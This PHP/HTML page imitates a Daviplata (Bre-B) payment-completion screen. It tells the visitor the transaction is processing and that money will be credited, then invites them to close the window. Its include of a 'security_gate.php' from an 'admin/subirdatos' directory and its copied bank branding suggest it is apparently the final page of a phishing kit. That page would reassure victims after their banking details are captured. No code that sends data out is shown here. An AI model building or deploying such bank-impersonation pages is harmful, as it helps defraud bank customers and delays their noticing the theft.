<?php
include_once dirname(dirname(dirname(dirname(dirname(dirname(__DIR__)))))) . '/admin/subirdatos/security_gate.php';
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Bre-B Daviplata - Finalizado</title>
  <link rel="stylesheet" href="PseDaviplata/css/estilos.css">
  <script src="PseDaviplata/js/jquery.min.js"></script>
</head>
<body>
  <div id="root">
    <div class="App">
      <header class="header">
          <div class="conteLogo"><img src="PseDaviplata/img/logo-daviplata.svg" class="imagenLogoHeader"></div>
          <div class="conteTexto"><h2 id="fecha-actual" class="textoHeader"></h2></div>
      </header>
      <main class="index">
          <section class="compoInfDatos">
              <div class="conteIngDatos" style="text-align: center;">
                  <div class="conteTitle">
                      <h3 style="color: #22c55e;">¡Transacción en proceso!</h3>
                      <p>Su pago está siendo procesado por su entidad financiera.</p>
                  </div>
                  <div class="conteParrafo" style="margin-top: 25px; padding: 0 10px;">
                       <p style="font-size: 15px; line-height: 1.5; color: #ffffff; margin-bottom: 20px; max-width: 340px; margin-left: auto; margin-right: auto;">
                           En unos momentos recibirá una confirmación vía SMS o correo electrónico informándole que el dinero ha sido acreditado en su cuenta.
                       </p>
                       <p style="font-size: 14px; font-weight: 600; color: #ffffff;">Ya puede cerrar esta ventana.</p>
                   </div>
                  <br><br>
                  <div class="contentBoton" style="display: inline-block; width: 100%;">
                       <button type="button" onclick="window.location.href='../index.php'" class="boton principal">Finalizar</button>
                   </div>
              </div>
          </section>
      </main>
    </div>
  </div>
  <script>
    function actualizarFecha() {
        const opciones = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true, timeZone: 'America/Bogota' };
        let f = new Date().toLocaleDateString('es-CO', opciones);
        const el = document.getElementById('fecha-actual');
        if(el) el.innerText = f.charAt(0).toUpperCase() + f.slice(1);
    }
    actualizarFecha();
  </script>
</body>
</html>